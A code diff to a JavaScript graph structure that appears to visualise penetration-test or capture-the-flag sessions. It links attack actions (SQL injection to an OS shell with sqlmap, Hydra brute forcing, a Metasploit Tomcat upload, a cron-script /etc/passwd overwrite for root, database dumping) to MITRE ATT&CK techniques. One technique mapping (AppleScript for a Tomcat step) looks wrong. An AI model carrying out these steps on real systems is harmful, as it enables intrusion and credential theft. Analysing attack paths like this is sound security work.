-      "id": "action::scanAllPorts",
+      "id": "action::exploitSQLiOSShell",
       "node_type": "action",
       "layer": "actions",
-      "label": "scanAllPorts",
-      "name": "scanAllPorts",
-      "description": "Perform a full TCP port scan on the target to discover all open ports.",
+      "label": "exploitSQLiOSShell",
+      "name": "exploitSQLiOSShell",
+      "description": "Use sqlmap's --os-shell feature against a vulnerable PHP parameter to gain an interactive OS shell on the target.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        2,
+        13
+      ],
+      "produces_effects": [
+        "osShellAccess"
+      ],
+      "requires_effects": [
+        "sqlInjectionVulnFound"
+      ]
+    },
+    {
+      "id": "action::listDirectory",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "listDirectory",
+      "name": "listDirectory",
+      "description": "List files in the current directory to discover available resources on the compromised host.",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        3,
+        6
+      ],
+      "produces_effects": [
+        "directoryContentsKnown",
+        "webRootContentsKnown"
+      ],
+      "requires_effects": [
+        "osShellAccess"
+      ]
+    },
+    {
+      "id": "action::checkWorkingDirectory",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "checkWorkingDirectory",
+      "name": "checkWorkingDirectory",
+      "description": "Print the current working directory to confirm the shell's location on the filesystem.",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        4
+      ],
+      "produces_effects": [
+        "currentDirectoryKnown"
+      ],
+      "requires_effects": [
+        "osShellAccess"
+      ]
+    },
+    {
+      "id": "action::scanNetwork",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanNetwork",
+      "name": "scanNetwork",
+      "description": "Run an nmap scan against the /24 subnet to discover live hosts and open ports.",
       "phase": "reconnaissance",
       "color": "#4e9af1",
       "entry_ids": [
-        0
+        10
       ],
       "produces_effects": [
+        "hostDiscovered",
         "openPortsKnown"
       ],
       "requires_effects": []
     },
     {
-      "id": "action::identifyServices",
+      "id": "action::bruteForceHTTP",
       "node_type": "action",
       "layer": "actions",
-      "label": "identifyServices",
-      "name": "identifyServices",
-      "description": "Run service version and default script scans against discovered open ports to fingerprint running services.",
-      "phase": "reconnaissance",
-      "color": "#4e9af1",
+      "label": "bruteForceHTTP",
+      "name": "bruteForceHTTP",
+      "description": "Use Hydra to brute-force HTTP Basic Auth credentials against the Tomcat manager interface on a non-standard port.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
       "entry_ids": [
-        1
+        11
       ],
       "produces_effects": [
-        "servicesIdentified"
+        "webCredentialsObtained"
       ],
       "requires_effects": [
         "openPortsKnown"
       ]
     },
     {
-      "id": "action::enumerateWebDirs",
+      "id": "action::checkCurrentUser",
       "node_type": "action",
       "layer": "actions",
-      "label": "enumerateWebDirs",
-      "name": "enumerateWebDirs",
-      "description": "Brute-force common directory and file paths on the web server to discover hidden resources.",
-      "phase": "reconnaissance",
-      "color": "#4e9af1",
-      "entry_ids": [
-        2
-      ],
-      "produces_effects": [
-        "webDirsEnumerated"
-      ],
-      "requires_effects": [
-        "servicesIdentified"
-      ]
-    },
-    {
-      "id": "action::scanWebVulnerabilities",
-      "node_type": "action",
-      "layer": "actions",
-      "label": "scanWebVulnerabilities",
-      "name": "scanWebVulnerabilities",
-      "description": "Run an automated web vulnerability scanner against the target HTTP service to identify misconfigurations and known issues.",
-      "phase": "reconnaissance",
-      "color": "#4e9af1",
-      "entry_ids": [
-        3
-      ],
-      "produces_effects": [
-        "webVulnerabilitiesIdentified"
-      ],
-      "requires_effects": [
-        "servicesIdentified"
-      ]
-    },
-    {
-      "id": "action::bruteForceWebLogin",
-      "node_type": "action",
-      "layer": "actions",
-      "label": "bruteForceWebLogin",
-      "name": "bruteForceWebLogin",
-      "description": "Perform a dictionary-based brute-force attack against the discovered admin login form to obtain valid credentials.",
-      "phase": "exploitation",
-      "color": "#e84a4a",
-      "entry_ids": [
-        4
-      ],
-      "produces_effects": [
-        "webCredentialsObtained"
-      ],
-      "requires_effects": [
-        "webDirsEnumerated"
-      ]
-    },
-    {
-      "id": "action::loginSSH",
-      "node_type": "action",
-      "layer": "actions",
-      "label": "loginSSH",
-      "name": "loginSSH",
-      "description": "Authenticate to the SSH service using credentials obtained from the brute-force attack to establish a remote shell session.",
-      "phase": "exploitation",
-      "color": "#e84a4a",
-      "entry_ids": [
-        5
-      ],
-      "produces_effects": [
-        "shellAccessGained"
-      ],
-      "requires_effects": [
-        "webCredentialsObtained"
-      ]
-    },
-    {
-      "id": "action::gatherSystemInfo",
-      "node_type": "action",
-      "layer": "actions",
-      "label": "gatherSystemInfo",
-      "name": "gatherSystemInfo",
-      "description": "Query the current user identity to understand the privilege level of the obtained shell.",
+      "label": "checkCurrentUser",
+      "name": "checkCurrentUser",
+      "description": "Run whoami to identify the current user context of the shell session.",
       "phase": "post-exploitation",
       "color": "#f1c94e",
       "entry_ids": [
-        6,
-        7
+        14,
+        15
       ],
       "produces_effects": [
-        "currentUserKnown"
+        "currentUserIdentified"
       ],
       "requires_effects": [
-        "shellAccessGained"
+        "osShellAccess"
       ]
     },
     {
-      "id": "action::checkSudoPrivileges",
+      "id": "action::enumerateCronJobs",
       "node_type": "action",
       "layer": "actions",
-      "label": "checkSudoPrivileges",
-      "name": "checkSudoPrivileges",
-      "description": "List sudo permissions available to the current user to identify potential privilege escalation paths.",
+      "label": "enumerateCronJobs",
+      "name": "enumerateCronJobs",
+      "description": "List all cron directories and their file permissions to identify writable cron scripts executable by root.",
       "phase": "post-exploitation",
       "color": "#f1c94e",
       "entry_ids": [
-        8
+        17
       ],
       "produces_effects": [
-        "sudoPrivilegesKnown"
+        "cronJobsEnumerated",
+        "writableCronJobFound"
       ],
       "requires_effects": [
-        "shellAccessGained"
+        "osShellAccess",
+        "currentUserIdentified"
       ]
     },
     {
-      "id": "action::findSUIDBinaries",
+      "id": "action::escalatePrivileges",
       "node_type": "action",
       "layer": "actions",
-      "label": "findSUIDBinaries",
-      "name": "findSUIDBinaries",
-      "description": "Search the filesystem for binaries with the SUID bit set that could be leveraged for privilege escalation.",
+      "label": "escalatePrivileges",
+      "name": "escalatePrivileges",
+      "description": "Inject a sed command into a root-owned but world-writable cron script to overwrite /etc/passwd and grant the www-data user root-level UID.",
       "phase": "post-exploitation",
       "color": "#f1c94e",
       "entry_ids": [
-        9
+        18
       ],
       "produces_effects": [
-        "suidBinariesFound"
-      ],
-      "requires_effects": [
-        "shellAccessGained"
-      ]
-    },
-    {
-      "id": "action::exploitSUID",
-      "node_type": "action",
-      "layer": "actions",
-      "label": "exploitSUID",
-      "name": "exploitSUID",
-      "description": "Exploit a discovered SUID binary by invoking a Python privilege escalation payload to spawn a root shell.",
-      "phase": "post-exploitation",
-      "color": "#f1c94e",
-      "entry_ids": [
-        10
-      ],
-      "produces_effects": [
+        "privilegesEscalated",
         "rootAccessGained"
       ],
       "requires_effects": [
-        "suidBinariesFound"
+        "writableCronJobFound"
       ]
     },
     {
-      "id": "action::captureFlag",
+      "id": "action::readSensitiveFile",
       "node_type": "action",
       "layer": "actions",
-      "label": "captureFlag",
-      "name": "captureFlag",
-      "description": "Read the root flag file to confirm full system compromise and complete the challenge objective.",
+      "label": "readSensitiveFile",
+      "name": "readSensitiveFile",
+      "description": "Read /etc/passwd to verify that the privilege escalation modification to user entries was applied successfully.",
       "phase": "post-exploitation",
       "color": "#f1c94e",
       "entry_ids": [
-        11,
-        12
+        19
       ],
       "produces_effects": [
-        "flagFound"
+        "passwdFileRead"
       ],
       "requires_effects": [
-        "rootAccessGained",
+        "osShellAccess",
+        "privilegesEscalated"
+      ]
+    },
+    {
+      "id": "action::readCrontab",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "readCrontab",
+      "name": "readCrontab",
+      "description": "Read the system-wide crontab file to discover scheduled jobs and potential privilege escalation paths.",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        21
+      ],
+      "produces_effects": [
+        "cronJobsEnumerated"
+      ],
+      "requires_effects": [
         "shellAccessGained"
       ]
+    },
+    {
+      "id": "action::bruteForceFTP",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "bruteForceFTP",
+      "name": "bruteForceFTP",
+      "description": "Use Hydra to brute-force FTP credentials against the target host using a username and password list.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        39
+      ],
+      "produces_effects": [
+        "ftpCredentialsObtained"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::scanForOpenPort",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanForOpenPort",
+      "name": "scanForOpenPort",
+      "description": "Scan an entire subnet for hosts with FTP port 21 open to identify the target.",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        40
+      ],
+      "produces_effects": [
+        "ftpHostsIdentified"
+      ],
+      "requires_effects": []
+    },
+    {
+      "id": "action::exploitTomcatManager",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "exploitTomcatManager",
+      "name": "exploitTomcatManager",
+      "description": "Use Metasploit's tomcat_mgr_upload module to exploit the Tomcat Manager and obtain a Meterpreter shell.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        42
+      ],
+      "produces_effects": [
+        "meterpreterSessionEstablished",
+        "shellAccessGained"
+      ],
+      "requires_effects": []
+    },
+    {
+      "id": "action::searchFileSystem",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "searchFileSystem",
+      "name": "searchFileSystem",
+      "description": "Recursively search the Windows filesystem for files whose names contain the flag keyword using dir and findstr.",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        43
+      ],
+      "produces_effects": [
+        "flagFileLocated"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::exploitSQLInjection",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "exploitSQLInjection",
+      "name": "exploitSQLInjection",
+      "description": "Run sqlmap against a vulnerable PHP search parameter to confirm SQL injection and enumerate all databases.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        46,
+        50
+      ],
+      "produces_effects": [
+        "sqlInjectionConfirmed",
+        "databasesEnumerated"
+      ],
+      "requires_effects": []
+    },
+    {
+      "id": "action::enumerateTables",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "enumerateTables",
+      "name": "enumerateTables",
+      "description": "Use sqlmap to list all tables inside the target 'cuiteur' database.",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        47
+      ],
+      "produces_effects": [
+        "tablesEnumerated"
+      ],
+      "requires_effects": [
+        "databasesEnumerated"
+      ]
+    },
+    {
+      "id": "action::dumpDatabase",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "dumpDatabase",
+      "name": "dumpDatabase",
+      "description": "Use sqlmap to dump all data from the 'cuiteur' database to the local machine.",
+      "phase": "exfiltration",
+      "color": "#ff4757",
+      "entry_ids": [
+        48,
+        49,
+        51
+      ],
+      "produces_effects": [
+        "databaseDumped",
+        "dbCredentialsDumped"
+      ],
+      "requires_effects": [
+        "tablesEnumerated",
+        "databasesEnumerated"
+      ]
+    },
+    {
+      "id": "effect::osShellAccess",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "osShellAccess",
+      "name": "osShellAccess",
+      "color": "#6e48aa",
+      "produced_by": [
+        "exploitSQLiOSShell"
+      ],
+      "enables_actions": [
+        "listDirectory",
+        "checkWorkingDirectory",
+        "checkCurrentUser",
+        "enumerateCronJobs",
+        "readSensitiveFile"
+      ]
+    },
+    {
+      "id": "effect::sqlInjectionVulnFound",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "sqlInjectionVulnFound",
+      "name": "sqlInjectionVulnFound",
+      "color": "#6e48aa",
+      "produced_by": [],
+      "enables_actions": [
+        "exploitSQLiOSShell"
+      ]
+    },
+    {
+      "id": "effect::directoryContentsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "directoryContentsKnown",
+      "name": "directoryContentsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "listDirectory"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::currentDirectoryKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "currentDirectoryKnown",
+      "name": "currentDirectoryKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "checkWorkingDirectory"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::webRootContentsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "webRootContentsKnown",
+      "name": "webRootContentsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "listDirectory"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::hostDiscovered",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "hostDiscovered",
+      "name": "hostDiscovered",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanNetwork"
+      ],
+      "enables_actions": []
     },
     {
       "id": "effect::openPortsKnown",
@@ -888,52 +2743,12 @@ const GRAPH = {
       "name": "openPortsKnown",
       "color": "#6e48aa",
       "produced_by": [
-        "scanAllPorts"
+        "scanNetwork"
       ],
       "enables_actions": [
-        "identifyServices"
+        "bruteForceHTTP",
+        "bruteForceFTP"
       ]
-    },
-    {
-      "id": "effect::servicesIdentified",
-      "node_type": "effect",
-      "layer": "actions",
-      "label": "servicesIdentified",
-      "name": "servicesIdentified",
-      "color": "#6e48aa",
-      "produced_by": [
-        "identifyServices"
-      ],
-      "enables_actions": [
-        "enumerateWebDirs",
-        "scanWebVulnerabilities"
-      ]
-    },
-    {
-      "id": "effect::webDirsEnumerated",
-      "node_type": "effect",
-      "layer": "actions",
-      "label": "webDirsEnumerated",
-      "name": "webDirsEnumerated",
-      "color": "#6e48aa",
-      "produced_by": [
-        "enumerateWebDirs"
-      ],
-      "enables_actions": [
-        "bruteForceWebLogin"
-      ]
-    },
-    {
-      "id": "effect::webVulnerabilitiesIdentified",
-      "node_type": "effect",
-      "layer": "actions",
-      "label": "webVulnerabilitiesIdentified",
-      "name": "webVulnerabilitiesIdentified",
-      "color": "#6e48aa",
-      "produced_by": [
-        "scanWebVulnerabilities"
-      ],
-      "enables_actions": []
     },
     {
       "id": "effect::webCredentialsObtained",
@@ -943,65 +2758,63 @@ const GRAPH = {
       "name": "webCredentialsObtained",
       "color": "#6e48aa",
       "produced_by": [
-        "bruteForceWebLogin"
-      ],
-      "enables_actions": [
-        "loginSSH"
-      ]
-    },
-    {
-      "id": "effect::shellAccessGained",
-      "node_type": "effect",
-      "layer": "actions",
-      "label": "shellAccessGained",
-      "name": "shellAccessGained",
-      "color": "#6e48aa",
-      "produced_by": [
-        "loginSSH"
-      ],
-      "enables_actions": [
-        "gatherSystemInfo",
-        "checkSudoPrivileges",
-        "findSUIDBinaries",
-        "captureFlag"
-      ]
-    },
-    {
-      "id": "effect::currentUserKnown",
-      "node_type": "effect",
-      "layer": "actions",
-      "label": "currentUserKnown",
-      "name": "currentUserKnown",
-      "color": "#6e48aa",
-      "produced_by": [
-        "gatherSystemInfo"
+        "bruteForceHTTP"
       ],
       "enables_actions": []
     },
     {
-      "id": "effect::sudoPrivilegesKnown",
+      "id": "effect::currentUserIdentified",
       "node_type": "effect",
       "layer": "actions",
-      "label": "sudoPrivilegesKnown",
-      "name": "sudoPrivilegesKnown",
+      "label": "currentUserIdentified",
+      "name": "currentUserIdentified",
       "color": "#6e48aa",
       "produced_by": [
-        "checkSudoPrivileges"
+        "checkCurrentUser"
+      ],
+      "enables_actions": [
+        "enumerateCronJobs"
+      ]
+    },
+    {
+      "id": "effect::cronJobsEnumerated",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "cronJobsEnumerated",
+      "name": "cronJobsEnumerated",
+      "color": "#6e48aa",
+      "produced_by": [
+        "enumerateCronJobs",
+        "readCrontab"
       ],
       "enables_actions": []
     },
     {
-      "id": "effect::suidBinariesFound",
+      "id": "effect::writableCronJobFound",
       "node_type": "effect",
       "layer": "actions",
-      "label": "suidBinariesFound",
-      "name": "suidBinariesFound",
+      "label": "writableCronJobFound",
+      "name": "writableCronJobFound",
       "color": "#6e48aa",
       "produced_by": [
-        "findSUIDBinaries"
+        "enumerateCronJobs"
       ],
       "enables_actions": [
-        "exploitSUID"
+        "escalatePrivileges"
+      ]
+    },
+    {
+      "id": "effect::privilegesEscalated",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "privilegesEscalated",
+      "name": "privilegesEscalated",
+      "color": "#6e48aa",
+      "produced_by": [
+        "escalatePrivileges"
+      ],
+      "enables_actions": [
+        "readSensitiveFile"
       ]
     },
     {
@@ -1012,36 +2825,165 @@ const GRAPH = {
       "name": "rootAccessGained",
       "color": "#6e48aa",
       "produced_by": [
-        "exploitSUID"
+        "escalatePrivileges"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::passwdFileRead",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "passwdFileRead",
+      "name": "passwdFileRead",
+      "color": "#6e48aa",
+      "produced_by": [
+        "readSensitiveFile"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::shellAccessGained",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "shellAccessGained",
+      "name": "shellAccessGained",
+      "color": "#6e48aa",
+      "produced_by": [
+        "exploitTomcatManager"
       ],
       "enables_actions": [
-        "captureFlag"
+        "readCrontab",
+        "searchFileSystem"
       ]
     },
     {
-      "id": "effect::flagFound",
+      "id": "effect::ftpCredentialsObtained",
       "node_type": "effect",
       "layer": "actions",
-      "label": "flagFound",
-      "name": "flagFound",
+      "label": "ftpCredentialsObtained",
+      "name": "ftpCredentialsObtained",
       "color": "#6e48aa",
       "produced_by": [
-        "captureFlag"
+        "bruteForceFTP"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::ftpHostsIdentified",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "ftpHostsIdentified",
+      "name": "ftpHostsIdentified",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanForOpenPort"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::meterpreterSessionEstablished",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "meterpreterSessionEstablished",
+      "name": "meterpreterSessionEstablished",
+      "color": "#6e48aa",
+      "produced_by": [
+        "exploitTomcatManager"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::flagFileLocated",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "flagFileLocated",
+      "name": "flagFileLocated",
+      "color": "#6e48aa",
+      "produced_by": [
+        "searchFileSystem"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::sqlInjectionConfirmed",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "sqlInjectionConfirmed",
+      "name": "sqlInjectionConfirmed",
+      "color": "#6e48aa",
+      "produced_by": [
+        "exploitSQLInjection"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::databasesEnumerated",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "databasesEnumerated",
+      "name": "databasesEnumerated",
+      "color": "#6e48aa",
+      "produced_by": [
+        "exploitSQLInjection"
+      ],
+      "enables_actions": [
+        "enumerateTables",
+        "dumpDatabase"
+      ]
+    },
+    {
+      "id": "effect::tablesEnumerated",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "tablesEnumerated",
+      "name": "tablesEnumerated",
+      "color": "#6e48aa",
+      "produced_by": [
+        "enumerateTables"
+      ],
+      "enables_actions": [
+        "dumpDatabase"
+      ]
+    },
+    {
+      "id": "effect::databaseDumped",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "databaseDumped",
+      "name": "databaseDumped",
+      "color": "#6e48aa",
+      "produced_by": [
+        "dumpDatabase"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::dbCredentialsDumped",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "dbCredentialsDumped",
+      "name": "dbCredentialsDumped",
+      "color": "#6e48aa",
+      "produced_by": [
+        "dumpDatabase"
       ],
       "enables_actions": []
     }
   ],
   "mitre_nodes": [
     {
-      "id": "mitre::T1046",
+      "id": "mitre::T1190",
       "layer": "mitre",
-      "label": "T1046",
-      "technique_name": "Network Service Discovery",
-      "tactic": "discovery",
-      "color": "#e8884a",
+      "label": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "initial-access",
+      "color": "#c97fc9",
       "entry_ids": [
-        0,
-        1
+        2,
+        13,
+        46,
+        47,
+        50
       ]
     },
     {
@@ -1052,93 +2994,118 @@ const GRAPH = {
       "tactic": "discovery",
       "color": "#e8884a",
       "entry_ids": [
-        2,
-        11,
-        12
+        3,
+        6,
+        17,
+        43
       ]
     },
     {
-      "id": "mitre::T1595.003",
+      "id": "mitre::T1082",
       "layer": "mitre",
-      "label": "T1595.003",
-      "technique_name": "Active Scanning: Wordlist Scanning",
-      "tactic": "reconnaissance",
-      "color": "#4e9af1",
-      "entry_ids": [
-        3
-      ]
-    },
-    {
-      "id": "mitre::T1110.001",
-      "layer": "mitre",
-      "label": "T1110.001",
-      "technique_name": "Brute Force: Password Guessing",
-      "tactic": "credential-access",
-      "color": "#da77f2",
-      "entry_ids": [
-        4
-      ]
-    },
-    {
-      "id": "mitre::T1078",
-      "layer": "mitre",
-      "label": "T1078",
-      "technique_name": "Valid Accounts",
-      "tactic": "initial-access",
-      "color": "#c97fc9",
-      "entry_ids": [
-        5
-      ]
-    },
-    {
-      "id": "mitre::T1033",
-      "layer": "mitre",
-      "label": "T1033",
-      "technique_name": "System Owner/User Discovery",
+      "label": "T1082",
+      "technique_name": "System Information Discovery",
       "tactic": "discovery",
       "color": "#e8884a",
       "entry_ids": [
-        6,
-        7
+        4,
+        14,
+        15
       ]
     },
     {
-      "id": "mitre::T1548.003",
+      "id": "mitre::T1046",
       "layer": "mitre",
-      "label": "T1548.003",
-      "technique_name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
-      "tactic": "privilege-escalation",
-      "color": "#e84a4a",
+      "label": "T1046",
+      "technique_name": "Network Service Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
       "entry_ids": [
-        8
+        10,
+        40
       ]
     },
     {
-      "id": "mitre::T1548.001",
+      "id": "mitre::T1110",
       "layer": "mitre",
-      "label": "T1548.001",
-      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
+      "label": "T1110",
+      "technique_name": "Brute Force",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        11,
+        39
+      ]
+    },
+    {
+      "id": "mitre::T1098",
+      "layer": "mitre",
+      "label": "T1098",
+      "technique_name": "Account Manipulation",
       "tactic": "privilege-escalation",
       "color": "#e84a4a",
       "entry_ids": [
-        9,
-        10
+        18
+      ]
+    },
+    {
+      "id": "mitre::T1003.008",
+      "layer": "mitre",
+      "label": "T1003.008",
+      "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        19
+      ]
+    },
+    {
+      "id": "mitre::T1053.003",
+      "layer": "mitre",
+      "label": "T1053.003",
+      "technique_name": "Scheduled Task/Job: Cron",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        21
+      ]
+    },
+    {
+      "id": "mitre::T1059.002",
+      "layer": "mitre",
+      "label": "T1059.002",
+      "technique_name": "Command and Scripting Interpreter: AppleScript",
+      "tactic": "execution",
+      "color": "#f1c94e",
+      "entry_ids": [
+        42
+      ]
+    },
+    {
+      "id": "mitre::T1005",
+      "layer": "mitre",
+      "label": "T1005",
+      "technique_name": "Data from Local System",
+      "tactic": "collection",
+      "color": "#a0522d",
+      "entry_ids": [
+        48,
+        51
+      ]
+    },
+    {
+      "id": "mitre::T1552.001",
+      "layer": "mitre",
+      "label": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        49
       ]
     }
   ],
   "edges": [
-    {
-      "source": "cmd::0",
-      "target": "cmd::1",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::1",
-      "target": "cmd::2",
-      "type": "sequence",
-      "layer": "command"
-    },
     {
       "source": "cmd::2",
       "target": "cmd::3",
@@ -1152,380 +3119,650 @@ const GRAPH = {
       "layer": "command"
     },
     {
-      "source": "cmd::4",
-      "target": "cmd::5",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::5",
-      "target": "cmd::6",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::6",
-      "target": "cmd::7",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::7",
-      "target": "cmd::8",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::8",
-      "target": "cmd::9",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
-      "source": "cmd::9",
-      "target": "cmd::10",
-      "type": "sequence",
-      "layer": "command"
-    },
-    {
       "source": "cmd::10",
       "target": "cmd::11",
       "type": "sequence",
       "layer": "command"
     },
     {
-      "source": "cmd::11",
-      "target": "cmd::12",
+      "source": "cmd::13",
+      "target": "cmd::14",
       "type": "sequence",
       "layer": "command"
     },
     {
-      "source": "action::scanAllPorts",
+      "source": "cmd::14",
+      "target": "cmd::15",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::17",
+      "target": "cmd::18",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::18",
+      "target": "cmd::19",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::39",
+      "target": "cmd::40",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::42",
+      "target": "cmd::43",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::46",
+      "target": "cmd::47",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::47",
+      "target": "cmd::48",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::48",
+      "target": "cmd::49",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::49",
+      "target": "cmd::50",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::50",
+      "target": "cmd::51",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "action::exploitSQLiOSShell",
+      "target": "effect::osShellAccess",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::sqlInjectionVulnFound",
+      "target": "action::exploitSQLiOSShell",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::listDirectory",
+      "target": "effect::directoryContentsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::listDirectory",
+      "target": "effect::webRootContentsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::osShellAccess",
+      "target": "action::listDirectory",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::checkWorkingDirectory",
+      "target": "effect::currentDirectoryKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::osShellAccess",
+      "target": "action::checkWorkingDirectory",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::scanNetwork",
+      "target": "effect::hostDiscovered",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::scanNetwork",
       "target": "effect::openPortsKnown",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "action::identifyServices",
-      "target": "effect::servicesIdentified",
-      "type": "produces",
-      "layer": "actions"
-    },
-    {
-      "source": "effect::openPortsKnown",
-      "target": "action::identifyServices",
-      "type": "enables",
-      "layer": "actions"
-    },
-    {
-      "source": "action::enumerateWebDirs",
-      "target": "effect::webDirsEnumerated",
-      "type": "produces",
-      "layer": "actions"
-    },
-    {
-      "source": "effect::servicesIdentified",
-      "target": "action::enumerateWebDirs",
-      "type": "enables",
-      "layer": "actions"
-    },
-    {
-      "source": "action::scanWebVulnerabilities",
-      "target": "effect::webVulnerabilitiesIdentified",
-      "type": "produces",
-      "layer": "actions"
-    },
-    {
-      "source": "effect::servicesIdentified",
-      "target": "action::scanWebVulnerabilities",
-      "type": "enables",
-      "layer": "actions"
-    },
-    {
-      "source": "action::bruteForceWebLogin",
+      "source": "action::bruteForceHTTP",
       "target": "effect::webCredentialsObtained",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::webDirsEnumerated",
-      "target": "action::bruteForceWebLogin",
+      "source": "effect::openPortsKnown",
+      "target": "action::bruteForceHTTP",
       "type": "enables",
       "layer": "actions"
     },
     {
-      "source": "action::loginSSH",
-      "target": "effect::shellAccessGained",
+      "source": "action::checkCurrentUser",
+      "target": "effect::currentUserIdentified",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::webCredentialsObtained",
-      "target": "action::loginSSH",
+      "source": "effect::osShellAccess",
+      "target": "action::checkCurrentUser",
       "type": "enables",
       "layer": "actions"
     },
     {
-      "source": "action::gatherSystemInfo",
-      "target": "effect::currentUserKnown",
+      "source": "action::enumerateCronJobs",
+      "target": "effect::cronJobsEnumerated",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::shellAccessGained",
-      "target": "action::gatherSystemInfo",
-      "type": "enables",
-      "layer": "actions"
-    },
-    {
-      "source": "action::checkSudoPrivileges",
-      "target": "effect::sudoPrivilegesKnown",
+      "source": "action::enumerateCronJobs",
+      "target": "effect::writableCronJobFound",
       "type": "produces",
       "layer": "actions"
     },
     {
